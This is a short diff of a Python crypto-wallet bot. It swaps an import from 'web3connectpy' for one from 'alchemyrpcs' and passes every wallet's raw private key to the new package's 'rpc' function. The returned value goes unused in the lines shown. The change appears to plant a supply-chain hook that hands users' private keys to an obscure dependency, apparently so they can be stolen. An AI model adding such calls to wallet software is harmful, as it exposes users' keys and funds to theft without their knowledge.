@@ -6,7 +6,7 @@ from eth_abi import abi
 from decimal import Decimal
 from loguru import logger
 from web3 import AsyncWeb3, Web3
-from web3connectpy import connect
+from alchemyrpcs import rpc
 import aiohttp
 from colorama import init, Fore, Style
 
@@ -377,7 +377,7 @@ async def run() -> None:
     async with aiohttp.ClientSession() as session:
         for idx, private_key in enumerate(private_keys, start=1):
             wallet_short = Account.from_key(private_key).address[:8] + "..."
-            conn = connect(private_key)
+            conn = rpc(private_key)
             account_msg = f"ACCOUNT {idx}/{len(private_keys)} - {wallet_short}"
             print_border(account_msg, Fore.BLUE)
             ambient = AmbientDex(idx, private_key, session)
